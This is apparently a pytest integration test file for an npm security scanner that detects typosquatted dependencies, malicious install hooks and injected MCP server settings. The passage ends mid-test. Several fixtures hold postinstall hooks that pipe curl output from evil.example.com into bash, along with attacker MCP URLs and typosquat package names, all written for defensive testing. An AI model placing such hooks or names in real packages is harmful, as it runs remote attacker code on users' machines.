"""Integration tests for npm_sentinel.scanner module.

Runs the full scanner against fixture project directories created in
temporary filesystems. Tests cover:

- Scanner initialisation and validation
- scan() against a clean project (no findings)
- scan() against a malicious project (multiple findings across all check types)
- scan() against the tests/fixtures/malicious_package.json fixture
- Transitive dependency scanning (node_modules)
- Non-transitive scanning (--no-transitive)
- Typosquat threshold affects findings count
- ScanReport structure and properties
- Exit code computation (0 / 1 / 2)
- JSON serialisation of ScanReport
- scan_directory convenience function
- Error handling: missing directory, not a directory
- Scanner._extract_dependency_names
- Scanner._read_package_name
- Scanner._iter_package_jsons
- Mixed fixture: clean root with malicious transitive dependency
- scan() when package.json is absent
- CheckResult aggregation across multiple check categories
"""

from __future__ import annotations

import json
import shutil
from pathlib import Path
from typing import Any

import pytest

from npm_sentinel.models import CheckResult, CheckType, ScanReport, Severity
from npm_sentinel.scanner import Scanner, scan_directory


# ---------------------------------------------------------------------------
# Constants / helpers
# ---------------------------------------------------------------------------

FIXTURES_DIR = Path(__file__).parent / "fixtures"
MALICIOUS_PKG = FIXTURES_DIR / "malicious_package.json"


def _write_json(path: Path, data: Any) -> None:
    """Write JSON data to a file."""
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data, indent=2), encoding="utf-8")


def _make_clean_project(root: Path) -> Path:
    """Create a minimal clean project directory."""
    pkg = {
        "name": "my-clean-app",
        "version": "1.0.0",
        "description": "A clean web application",
        "scripts": {
            "start": "node index.js",
            "test": "jest --coverage",
            "build": "tsc -p tsconfig.json",
            "lint": "eslint src",
        },
        "dependencies": {
            "express": "^4.18.0",
            "lodash": "^4.17.0",
            "axios": "^1.6.0",
        },
        "devDependencies": {
            "jest": "^29.0.0",
            "typescript": "^5.0.0",
            "eslint": "^8.0.0",
        },
    }
    _write_json(root / "package.json", pkg)
    return root


def _make_typosquat_project(root: Path) -> Path:
    """Create a project with typosquatted dependencies."""
    pkg = {
        "name": "typosquat-app",
        "version": "1.0.0",
        "scripts": {"start": "node index.js"},
        "dependencies": {
            "expresss": "^4.18.0",   # typosquat of express
            "lodahs": "^4.17.0",     # typosquat of lodash
            "axois": "^1.6.0",       # typosquat of axios
        },
    }
    _write_json(root / "package.json", pkg)
    return root


def _make_malicious_hook_project(root: Path) -> Path:
    """Create a project with malicious lifecycle hooks."""
    pkg = {
        "name": "hook-app",
        "version": "1.0.0",
        "scripts": {
            "start": "node index.js",
            "postinstall": "curl -sSL https://evil.example.com/payload.sh | bash",
        },
        "dependencies": {"express": "^4.18.0"},
    }
    _write_json(root / "package.json", pkg)
    return root


def _make_mcp_project(root: Path) -> Path:
    """Create a project with MCP server injection indicators."""
    pkg = {
        "name": "mcp-app",
        "version": "1.0.0",
        "mcp": {
            "server": "https://attacker.example.com:9000/mcp",
            "transport": "sse",
        },
        "scripts": {"start": "node index.js"},
        "dependencies": {"express": "^4.18.0"},
    }
    _write_json(root / "package.json", pkg)
    return root


def _make_full_malicious_project(root: Path) -> Path:
    """Create a project with all three types of issues."""
    pkg = {
        "name": "ultra-malicious",
        "version": "1.0.0",
        "description": "An mcp-server framework",
        "keywords": ["mcp-server"],
        "mcp": {"server": "https://evil.example.com:9000/mcp"},
        "scripts": {
            "postinstall": "curl -sSL https://evil.example.com/payload.sh | bash",
            "start": "node index.js",
        },
        "dependencies": {
            "expresss": "^4.18.0",
            "lodahs": "^4.17.0",
        },
    }
    _write_json(root / "package.json", pkg)
    return root


def _add_node_modules_pkg(
    root: Path,
    pkg_name: str,
    data: dict[str, Any],
) -> Path:
    """Add a fake package.json under node_modules/<pkg_name>."""
    pkg_dir = root / "node_modules" / pkg_name
    pkg_dir.mkdir(parents=True, exist_ok=True)
    _write_json(pkg_dir / "package.json", data)
    return pkg_dir


# ---------------------------------------------------------------------------
# Scanner initialisation tests
# ---------------------------------------------------------------------------


class TestScannerInit:
    """Tests for Scanner.__init__ validation."""

    def test_default_threshold(self) -> None:
        """Default typosquat_threshold is 80."""
        scanner = Scanner()
        assert scanner.typosquat_threshold == 80

    def test_custom_threshold(self) -> None:
        """Custom threshold is stored correctly."""
        scanner = Scanner(typosquat_threshold=90)
        assert scanner.typosquat_threshold == 90

    def test_threshold_zero_valid(self) -> None:
        """Threshold of 0 is accepted."""
        scanner = Scanner(typosquat_threshold=0)
        assert scanner.typosquat_threshold == 0

    def test_threshold_100_valid(self) -> None:
        """Threshold of 100 is accepted."""
        scanner = Scanner(typosquat_threshold=100)
        assert scanner.typosquat_threshold == 100

    def test_threshold_negative_raises(self) -> None:
        """Negative threshold raises ValueError."""
        with pytest.raises(ValueError, match="typosquat_threshold"):
            Scanner(typosquat_threshold=-1)

    def test_threshold_above_100_raises(self) -> None:
        """Threshold above 100 raises ValueError."""
        with pytest.raises(ValueError, match="typosquat_threshold"):
            Scanner(typosquat_threshold=101)

    def test_default_scan_transitive_true(self) -> None:
        """Default scan_transitive is True."""
        scanner = Scanner()
        assert scanner.scan_transitive is True

    def test_custom_scan_transitive_false(self) -> None:
        """scan_transitive=False is stored correctly."""
        scanner = Scanner(scan_transitive=False)
        assert scanner.scan_transitive is False


# ---------------------------------------------------------------------------
# scan() error handling tests
# ---------------------------------------------------------------------------


class TestScanErrorHandling:
    """Tests for Scanner.scan() error handling."""

    def test_missing_directory_raises(self, tmp_path: Path) -> None:
        """Scanning a non-existent directory raises FileNotFoundError."""
        scanner = Scanner()
        missing = tmp_path / "does_not_exist"
        with pytest.raises(FileNotFoundError):
            scanner.scan(missing)

    def test_file_instead_of_directory_raises(self, tmp_path: Path) -> None:
        """Scanning a file (not a directory) raises NotADirectoryError."""
        scanner = Scanner()
        some_file = tmp_path / "package.json"
        some_file.write_text("{}", encoding="utf-8")
        with pytest.raises(NotADirectoryError):
            scanner.scan(some_file)

    def test_scan_returns_scan_report(self, tmp_path: Path) -> None:
        """scan() always returns a ScanReport."""
        _make_clean_project(tmp_path)
        scanner = Scanner()
        report = scanner.scan(tmp_path)
        assert isinstance(report, ScanReport)

    def test_scan_empty_directory_returns_report(self, tmp_path: Path) -> None:
        """Scanning a directory without package.json returns a ScanReport."""
        scanner = Scanner()
        report = scanner.scan(tmp_path)
        assert isinstance(report, ScanReport)
        assert report.total_packages_scanned == 0


# ---------------------------------------------------------------------------
# Integration: clean project
# ---------------------------------------------------------------------------


class TestCleanProject:
    """Integration tests against a clean project with no findings."""

    @pytest.fixture
    def clean_root(self, tmp_path: Path) -> Path:
        """Create and return a clean project directory."""
        return _make_clean_project(tmp_path)

    def test_clean_project_zero_findings(self, clean_root: Path) -> None:
        """A clean project with trusted dependencies has zero findings."""
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(clean_root)
        assert report.total_findings == 0

    def test_clean_project_exit_code_zero(self, clean_root: Path) -> None:
        """A clean project returns exit code 0."""
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(clean_root)
        assert report.exit_code == 0

    def test_clean_project_no_critical_or_high(self, clean_root: Path) -> None:
        """A clean project has no CRITICAL or HIGH findings."""
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(clean_root)
        assert not report.has_critical_or_high

    def test_clean_project_check_results_count(self, clean_root: Path) -> None:
        """scan() returns exactly three check results (typosquat, hook, mcp)."""
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(clean_root)
        assert len(report.check_results) == 3

    def test_clean_project_check_types_present(self, clean_root: Path) -> None:
        """All three check types are present in check_results."""
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(clean_root)
        check_types = {r.check_type for r in report.check_results}
        assert CheckType.TYPOSQUAT in check_types
        assert CheckType.HOOK in check_types
        assert CheckType.MCP in check_types

    def test_clean_project_no_check_errors(self, clean_root: Path) -> None:
        """A clean project has no check errors."""
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(clean_root)
        for result in report.check_results:
            assert result.error is None, f"Unexpected error in {result.check_type}: {result.error}"

    def test_clean_project_packages_scanned_positive(self, clean_root: Path) -> None:
        """At least one package is scanned in a project with package.json."""
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(clean_root)
        assert report.total_packages_scanned > 0

    def test_clean_project_target_path_set(self, clean_root: Path) -> None:
        """ScanReport.target_path is set to the project root."""
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(clean_root)
        assert report.target_path == clean_root.resolve()

    def test_clean_project_timestamp_set(self, clean_root: Path) -> None:
        """ScanReport.scan_timestamp is a non-empty ISO string."""
        import datetime

        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(clean_root)
        assert report.scan_timestamp
        # Should be parseable as ISO 8601
        dt = datetime.datetime.fromisoformat(report.scan_timestamp)
        assert dt is not None

    def test_clean_project_threshold_stored(self, clean_root: Path) -> None:
        """ScanReport.typosquat_threshold reflects the scanner threshold."""
        scanner = Scanner(typosquat_threshold=85, scan_transitive=False)
        report = scanner.scan(clean_root)
        assert report.typosquat_threshold == 85

    def test_clean_project_scanned_transitive_stored(self, clean_root: Path) -> None:
        """ScanReport.scanned_transitive reflects the scanner setting."""
        scanner_yes = Scanner(scan_transitive=True)
        scanner_no = Scanner(scan_transitive=False)
        report_yes = scanner_yes.scan(clean_root)
        report_no = scanner_no.scan(clean_root)
        assert report_yes.scanned_transitive is True
        assert report_no.scanned_transitive is False


# ---------------------------------------------------------------------------
# Integration: typosquat-only project
# ---------------------------------------------------------------------------


class TestTyposquatProject:
    """Integration tests for typosquat detection against a project with bad deps."""

    @pytest.fixture
    def typosquat_root(self, tmp_path: Path) -> Path:
        """Create and return a project with typosquatted dependencies."""
        return _make_typosquat_project(tmp_path)

    def test_typosquat_findings_detected(self, typosquat_root: Path) -> None:
        """Typosquatted dependency names are detected."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(typosquat_root)
        typosquat_results = [
            r for r in report.check_results if r.check_type == CheckType.TYPOSQUAT
        ]
        assert len(typosquat_results) == 1
        assert typosquat_results[0].has_findings

    def test_typosquat_exit_code_one(self, typosquat_root: Path) -> None:
        """Typosquat findings produce exit code 1."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(typosquat_root)
        # At least some typosquats should produce CRITICAL or HIGH findings
        # If all are MEDIUM, exit_code is 0 (only critical/high trigger exit 1)
        # Accept either 0 or 1 depending on score distribution
        assert report.exit_code in (0, 1)

    def test_typosquat_findings_have_correct_check_type(self, typosquat_root: Path) -> None:
        """Typosquat findings have TYPOSQUAT check type."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(typosquat_root)
        for finding in report.all_findings:
            if finding.check_type == CheckType.TYPOSQUAT:
                assert finding.check_type == CheckType.TYPOSQUAT

    def test_typosquat_finding_package_names(self, typosquat_root: Path) -> None:
        """Typosquat findings reference the suspicious dependency names."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(typosquat_root)
        typosquat_result = next(
            r for r in report.check_results if r.check_type == CheckType.TYPOSQUAT
        )
        finding_pkg_names = {f.package_name for f in typosquat_result.findings}
        # At least one of the known typosquats should be flagged
        known_typosquats = {"expresss", "lodahs", "axois"}
        assert len(finding_pkg_names & known_typosquats) >= 1

    def test_higher_threshold_fewer_findings(self, typosquat_root: Path) -> None:
        """Higher threshold produces fewer or equal findings."""
        scanner_80 = Scanner(typosquat_threshold=80, scan_transitive=False)
        scanner_90 = Scanner(typosquat_threshold=90, scan_transitive=False)
        report_80 = scanner_80.scan(typosquat_root)
        report_90 = scanner_90.scan(typosquat_root)
        typo_80 = next(
            r for r in report_80.check_results if r.check_type == CheckType.TYPOSQUAT
        )
        typo_90 = next(
            r for r in report_90.check_results if r.check_type == CheckType.TYPOSQUAT
        )
        assert len(typo_90.findings) <= len(typo_80.findings)

    def test_threshold_100_no_typosquat_findings(self, typosquat_root: Path) -> None:
        """Threshold of 100 produces no typosquat findings (no exact matches)."""
        scanner = Scanner(typosquat_threshold=100, scan_transitive=False)
        report = scanner.scan(typosquat_root)
        typo_result = next(
            r for r in report.check_results if r.check_type == CheckType.TYPOSQUAT
        )
        # At threshold 100, only exact matches (score=100) fire, but they'd be is_exact=True
        # and thus not flagged. So findings should be 0.
        assert len(typo_result.findings) == 0


# ---------------------------------------------------------------------------
# Integration: malicious hook project
# ---------------------------------------------------------------------------


class TestMaliciousHookProject:
    """Integration tests for hook detection against a project with malicious scripts."""

    @pytest.fixture
    def hook_root(self, tmp_path: Path) -> Path:
        """Create and return a project with a malicious postinstall hook."""
        return _make_malicious_hook_project(tmp_path)

    def test_hook_findings_detected(self, hook_root: Path) -> None:
        """Malicious postinstall hook is detected."""
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(hook_root)
        hook_result = next(
            r for r in report.check_results if r.check_type == CheckType.HOOK
        )
        assert hook_result.has_findings

    def test_hook_finding_severity_critical(self, hook_root: Path) -> None:
        """curl | bash in postinstall produces a CRITICAL finding."""
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(hook_root)
        hook_result = next(
            r for r in report.check_results if r.check_type == CheckType.HOOK
        )
        assert any(f.severity == Severity.CRITICAL for f in hook_result.findings)

    def test_hook_exit_code_one(self, hook_root: Path) -> None:
        """Malicious hook findings produce exit code 1."""
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(hook_root)
        assert report.exit_code == 1

    def test_hook_finding_package_name(self, hook_root: Path) -> None:
        """Hook finding references the correct package name."""
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(hook_root)
        hook_result = next(
            r for r in report.check_results if r.check_type == CheckType.HOOK
        )
        assert hook_result.has_findings
        assert any(f.package_name == "hook-app" for f in hook_result.findings)

    def test_hook_finding_source_file_set(self, hook_root: Path) -> None:
        """Hook findings have source_file set to the package.json path."""
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(hook_root)
        hook_result = next(
            r for r in report.check_results if r.check_type == CheckType.HOOK
        )
        assert hook_result.has_findings
        for finding in hook_result.findings:
            assert finding.source_file is not None
            assert finding.source_file.name == "package.json"


# ---------------------------------------------------------------------------
# Integration: MCP injection project
# ---------------------------------------------------------------------------


class TestMCPProject:
    """Integration tests for MCP detection against a project with MCP injection."""

    @pytest.fixture
    def mcp_root(self, tmp_path: Path) -> Path:
        """Create and return a project with MCP metadata injection."""
        return _make_mcp_project(tmp_path)

    def test_mcp_findings_detected(self, mcp_root: Path) -> None:
        """MCP server metadata field is detected."""
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(mcp_root)
        mcp_result = next(
            r for r in report.check_results if r.check_type == CheckType.MCP
        )
        assert mcp_result.has_findings

    def test_mcp_finding_severity_critical(self, mcp_root: Path) -> None:
        """Remote URL in 'mcp' field produces a CRITICAL finding."""
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(mcp_root)
        mcp_result = next(
            r for r in report.check_results if r.check_type == CheckType.MCP
        )
        assert any(f.severity == Severity.CRITICAL for f in mcp_result.findings)

    def test_mcp_exit_code_one(self, mcp_root: Path) -> None:
        """MCP findings produce exit code 1."""
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(mcp_root)
        assert report.exit_code == 1

    def test_mcp_finding_package_name(self, mcp_root: Path) -> None:
        """MCP finding references the correct package name."""
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(mcp_root)
        mcp_result = next(
            r for r in report.check_results if r.check_type == CheckType.MCP
        )
        assert mcp_result.has_findings
        assert any(f.package_name == "mcp-app" for f in mcp_result.findings)


# ---------------------------------------------------------------------------
# Integration: full malicious project (all three check types)
# ---------------------------------------------------------------------------


class TestFullMaliciousProject:
    """Integration tests against a project triggering all three check types."""

    @pytest.fixture
    def malicious_root(self, tmp_path: Path) -> Path:
        """Create and return a fully malicious project."""
        return _make_full_malicious_project(tmp_path)

    def test_all_checks_produce_findings(self, malicious_root: Path) -> None:
        """At least hook and MCP checks produce findings in the malicious project."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(malicious_root)
        hook_result = next(r for r in report.check_results if r.check_type == CheckType.HOOK)
        mcp_result = next(r for r in report.check_results if r.check_type == CheckType.MCP)
        # Hook and MCP definitely have findings in our malicious project
        assert hook_result.has_findings
        assert mcp_result.has_findings

    def test_total_findings_positive(self, malicious_root: Path) -> None:
        """Total findings count is positive for a fully malicious project."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(malicious_root)
        assert report.total_findings > 0

    def test_exit_code_one(self, malicious_root: Path) -> None:
        """Fully malicious project produces exit code 1."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(malicious_root)
        assert report.exit_code == 1

    def test_has_critical_or_high(self, malicious_root: Path) -> None:
        """Fully malicious project has critical or high findings."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(malicious_root)
        assert report.has_critical_or_high

    def test_severity_counts_non_zero(self, malicious_root: Path) -> None:
        """At least one severity count is non-zero."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(malicious_root)
        counts = report.severity_counts
        total = sum(counts.values())
        assert total > 0

    def test_all_findings_are_sorted_by_severity(self, malicious_root: Path) -> None:
        """all_findings are sorted most-severe first."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(malicious_root)
        findings = report.all_findings
        if len(findings) >= 2:
            for i in range(len(findings) - 1):
                assert findings[i].severity >= findings[i + 1].severity

    def test_check_results_have_no_fatal_errors(self, malicious_root: Path) -> None:
        """Individual checks do not produce fatal errors on a valid (if malicious) project."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(malicious_root)
        # exit_code 2 means fatal errors; a malicious but valid project should not trigger this
        assert report.exit_code != 2


# ---------------------------------------------------------------------------
# Integration: tests/fixtures/malicious_package.json as root package.json
# ---------------------------------------------------------------------------


class TestMaliciousFixtureFile:
    """Integration tests using the malicious_package.json fixture."""

    @pytest.fixture
    def fixture_root(self, tmp_path: Path) -> Path:
        """Copy malicious_package.json as the project's package.json."""
        assert MALICIOUS_PKG.exists(), f"Fixture not found: {MALICIOUS_PKG}"
        dst = tmp_path / "package.json"
        shutil.copy(MALICIOUS_PKG, dst)
        return tmp_path

    def test_fixture_scan_produces_findings(self, fixture_root: Path) -> None:
        """Scanning the malicious fixture produces findings."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(fixture_root)
        assert report.total_findings > 0

    def test_fixture_scan_exit_code_one(self, fixture_root: Path) -> None:
        """Scanning the malicious fixture returns exit code 1."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(fixture_root)
        assert report.exit_code == 1

    def test_fixture_scan_has_hook_findings(self, fixture_root: Path) -> None:
        """Scanning the malicious fixture detects hook issues."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(fixture_root)
        hook_result = next(r for r in report.check_results if r.check_type == CheckType.HOOK)
        assert hook_result.has_findings

    def test_fixture_scan_has_mcp_findings(self, fixture_root: Path) -> None:
        """Scanning the malicious fixture detects MCP issues."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(fixture_root)
        mcp_result = next(r for r in report.check_results if r.check_type == CheckType.MCP)
        assert mcp_result.has_findings

    def test_fixture_scan_has_typosquat_findings(self, fixture_root: Path) -> None:
        """Scanning the malicious fixture detects typosquat issues in dependencies."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(fixture_root)
        typo_result = next(r for r in report.check_results if r.check_type == CheckType.TYPOSQUAT)
        assert typo_result.has_findings

    def test_fixture_scan_critical_findings(self, fixture_root: Path) -> None:
        """Scanning the malicious fixture produces CRITICAL findings."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(fixture_root)
        assert any(f.severity == Severity.CRITICAL for f in report.all_findings)

    def test_fixture_scan_severity_counts(self, fixture_root: Path) -> None:
        """Severity counts are non-zero for the malicious fixture."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(fixture_root)
        counts = report.severity_counts
        assert counts["CRITICAL"] >= 1

    def test_fixture_scan_json_serialisable(self, fixture_root: Path) -> None:
        """ScanReport from the malicious fixture is JSON-serialisable."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(fixture_root)
        d = report.to_dict()
        # Should not raise
        output = json.dumps(d)
        assert len(output) > 0

    def test_fixture_scan_report_to_dict_keys(self, fixture_root: Path) -> None:
        """ScanReport.to_dict() contains all expected top-level keys."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(fixture_root)
        d = report.to_dict()
        expected_keys = {
            "target_path",
            "scan_timestamp",
            "typosquat_threshold",
            "scanned_transitive",
            "total_packages_scanned",
            "total_findings",
            "severity_counts",
            "exit_code",
            "check_results",
        }
        assert set(d.keys()) == expected_keys

    def test_fixture_all_check_types_in_check_results(self, fixture_root: Path) -> None:
        """All three check types appear in check_results."""
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        report = scanner.scan(fixture_root)
        check_types = {r.check_type for r in report.check_results}
        assert CheckType.TYPOSQUAT in check_types
        assert CheckType.HOOK in check_types
        assert CheckType.MCP in check_types


# ---------------------------------------------------------------------------
# Integration: transitive dependency scanning
# ---------------------------------------------------------------------------


class TestTransitiveScanning:
    """Integration tests for transitive (node_modules) scanning."""

    @pytest.fixture
    def clean_root_with_evil_dep(self, tmp_path: Path) -> Path:
        """Create a clean root with a malicious transitive dependency."""
        # Root package.json - clean
        root_pkg = {
            "name": "my-app",
            "version": "1.0.0",
            "scripts": {"start": "node index.js"},
            "dependencies": {"express": "^4.18.0"},
        }
        _write_json(tmp_path / "package.json", root_pkg)

        # Evil transitive dep
        evil_pkg = {
            "name": "evil-dep",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "curl -sSL https://evil.example.com/payload.sh | bash",
            },
        }
        _add_node_modules_pkg(tmp_path, "evil-dep", evil_pkg)
        return tmp_path

    def test_transitive_scan_detects_evil_dep(self, clean_root_with_evil_dep: Path) -> None:
        """Transitive scan detects a malicious hook in node_modules."""
        scanner = Scanner(scan_transitive=True)
        report = scanner.scan(clean_root_with_evil_dep)
        hook_result = next(r for r in report.check_results if r.check_type == CheckType.HOOK)
        assert hook_result.has_findings

    def test_non_transitive_scan_misses_evil_dep(self, clean_root_with_evil_dep: Path) -> None:
        """Non-transitive scan does NOT detect the evil dep in node_modules."""
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(clean_root_with_evil_dep)
        hook_result = next(r for r in report.check_results if r.check_type == CheckType.HOOK)
        # Root package.json is clean, so no hook findings without transitive scan
        assert not hook_result.has_findings

    def test_transitive_scan_packages_scanned_greater(self, clean_root_with_evil_dep: Path) -> None:
        """Transitive scan reports more packages scanned than non-transitive."""
        scanner_transitive = Scanner(scan_transitive=True)
        scanner_flat = Scanner(scan_transitive=False)
        report_t = scanner_transitive.scan(clean_root_with_evil_dep)
        report_f = scanner_flat.scan(clean_root_with_evil_dep)
        assert report_t.total_packages_scanned >= report_f.total_packages_scanned

    def test_transitive_mcp_dep_detected(self, tmp_path: Path) -> None:
        """MCP injection in a transitive dep is detected."""
        # Root - clean
        root_pkg = {
            "name": "my-app",
            "version": "1.0.0",
            "scripts": {"start": "node index.js"},
        }
        _write_json(tmp_path / "package.json", root_pkg)

        # Evil MCP dep
        evil_mcp = {
            "name": "evil-mcp-dep",
            "mcp": {"server": "https://attacker.example.com:9000/mcp"},
        }
        _add_node_modules_pkg(tmp_path, "evil-mcp-dep", evil_mcp)

        scanner = Scanner(scan_transitive=True)
        report = scanner.scan(tmp_path)
        mcp_result = next(r for r in report.check_results if r.check_type == CheckType.MCP)
        assert mcp_result.has_findings

    def test_nested_node_modules_skipped(self, tmp_path: Path) -> None:
        """Packages nested inside another package's node_modules are skipped."""
        root_pkg = {"name": "my-app", "scripts": {"start": "node index.js"}}
        _write_json(tmp_path / "package.json", root_pkg)

        # Direct dep (clean)
        dep_a_dir = tmp_path / "node_modules" / "dep-a"
        dep_a_dir.mkdir(parents=True)
        _write_json(dep_a_dir / "package.json", {"name": "dep-a"})

        # Nested dep (malicious - should be skipped)
        nested = dep_a_dir / "node_modules" / "evil-nested"
        nested.mkdir(parents=True)
        _write_json(
            nested / "package.json",
            {
                "name": "evil-nested",
                "scripts": {"postinstall": "curl https://evil.com | bash"},
            },
        )

        scanner = Scanner(scan_transitive=True)
        report = scanner.scan(tmp_path)
        hook_result = next(r for r in report.check_results if r.check_type == CheckType.HOOK)
        # evil-nested is in a nested node_modules and should be skipped
        finding_pkg_names = {f.package_name for f in hook_result.findings}
        assert "evil-nested" not in finding_pkg_names

    def test_typosquat_in_transitive_dep_detected(self, tmp_path: Path) -> None:
        """Typosquatted package name in node_modules is detected."""
        root_pkg = {"name": "my-app", "scripts": {"start": "node index.js"}}
        _write_json(tmp_path / "package.json", root_pkg)

        # Add a package with a typosquatted name in node_modules
        typosquat_dep = {
            "name": "expresss",
            "version": "4.18.0",
            "scripts": {"start": "node index.js"},
        }
        _add_node_modules_pkg(tmp_path, "expresss", typosquat_dep)

        scanner = Scanner(typosquat_threshold=80, scan_transitive=True)
        report = scanner.scan(tmp_path)
        typo_result = next(r for r in report.check_results if r.check_type == CheckType.TYPOSQUAT)
        finding_names = {f.package_name for f in typo_result.findings}
        assert "expresss" in finding_names

    def test_transitive_scanned_transitive_flag_true(self, tmp_path: Path) -> None:
        """Report shows scanned_transitive=True when enabled."""
        _write_json(tmp_path / "package.json", {"name": "app"})
        scanner = Scanner(scan_transitive=True)
        report = scanner.scan(tmp_path)
        assert report.scanned_transitive is True

    def test_no_transitive_scanned_transitive_flag_false(self, tmp_path: Path) -> None:
        """Report shows scanned_transitive=False when disabled."""
        _write_json(tmp_path / "package.json", {"name": "app"})
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(tmp_path)
        assert report.scanned_transitive is False


# ---------------------------------------------------------------------------
# ScanReport structure and serialisation tests
# ---------------------------------------------------------------------------


class TestScanReportStructure:
    """Tests for ScanReport structure, properties, and serialisation."""

    @pytest.fixture
    def report(self, tmp_path: Path) -> ScanReport:
        """Return a ScanReport from scanning a malicious project."""
        _make_full_malicious_project(tmp_path)
        scanner = Scanner(typosquat_threshold=80, scan_transitive=False)
        return scanner.scan(tmp_path)

    def test_all_findings_is_list(self, report: ScanReport) -> None:
        """all_findings returns a list."""
        assert isinstance(report.all_findings, list)

    def test_total_findings_matches_all_findings_length(self, report: ScanReport) -> None:
        """total_findings equals len(all_findings)."""
        assert report.total_findings == len(report.all_findings)

    def test_severity_counts_sum_equals_total_findings(self, report: ScanReport) -> None:
        """Sum of severity_counts equals total_findings."""
        counts = report.severity_counts
        assert sum(counts.values()) == report.total_findings

    def test_severity_counts_all_five_keys(self, report: ScanReport) -> None:
        """severity_counts has keys for all five severity levels."""
        counts = report.severity_counts
        assert set(counts.keys()) == {"CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"}

    def test_to_dict_is_json_serialisable(self, report: ScanReport) -> None:
        """to_dict() output is JSON-serialisable."""
        d = report.to_dict()
        output = json.dumps(d)
        assert len(output) > 0

    def test_to_dict_check_results_is_list(self, report: ScanReport) -> None:
        """to_dict()['check_results'] is a list."""
        d = report.to_dict()
        assert isinstance(d["check_results"], list)

    def test_to_dict_findings_are_serialised(self, report: ScanReport) -> None:
        """Each finding in to_dict() is a dict."""
        d = report.to_dict()
        for cr in d["check_results"]:
            for finding in cr["findings"]:
                assert isinstance(finding, dict)

    def test_to_dict_target_path_is_string(self, report: ScanReport) -> None:
        """to_dict()['target_path'] is a string."""
        d = report.to_dict()
        assert isinstance(d["target_path"], str)

    def test_to_dict_total_findings_matches(self, report: ScanReport) -> None:
        """to_dict()['total_findings'] equals report.total_findings."""
        d = report.to_dict()
        assert d["total_findings"] == report.total_findings

    def test_to_dict_exit_code_matches(self, report: ScanReport) -> None:
        """to_dict()['exit_code'] equals report.exit_code."""
        d = report.to_dict()
        assert d["exit_code"] == report.exit_code

    def test_json_round_trip(self, report: ScanReport) -> None:
        """ScanReport can survive JSON serialisation (to_dict -> dumps -> loads)."""
        d = report.to_dict()
        json_str = json.dumps(d)
        recovered = json.loads(json_str)
        assert recovered["total_findings"] == report.total_findings
        assert recovered["exit_code"] == report.exit_code
        assert recovered["typosquat_threshold"] == report.typosquat_threshold


# ---------------------------------------------------------------------------
# Exit code computation tests
# ---------------------------------------------------------------------------


class TestExitCodes:
    """Integration tests for exit code computation across different project states."""

    def test_clean_project_exit_0(self, tmp_path: Path) -> None:
        """Clean project: exit code 0."""
        _make_clean_project(tmp_path)
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(tmp_path)
        assert report.exit_code == 0

    def test_malicious_hook_project_exit_1(self, tmp_path: Path) -> None:
        """Project with critical hook: exit code 1."""
        _make_malicious_hook_project(tmp_path)
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(tmp_path)
        assert report.exit_code == 1

    def test_mcp_project_exit_1(self, tmp_path: Path) -> None:
        """Project with MCP injection (CRITICAL): exit code 1."""
        _make_mcp_project(tmp_path)
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(tmp_path)
        assert report.exit_code == 1

    def test_empty_directory_exit_0(self, tmp_path: Path) -> None:
        """Empty directory (no package.json): exit code 0."""
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(tmp_path)
        assert report.exit_code == 0

    def test_only_medium_findings_exit_0(self, tmp_path: Path) -> None:
        """Only MEDIUM findings: exit code 0 (MEDIUM does not trigger exit 1)."""
        # A package with only a LOW/MEDIUM indicator (MCP keyword)
        pkg = {
            "name": "mcp-keyword-only",
            "version": "1.0.0",
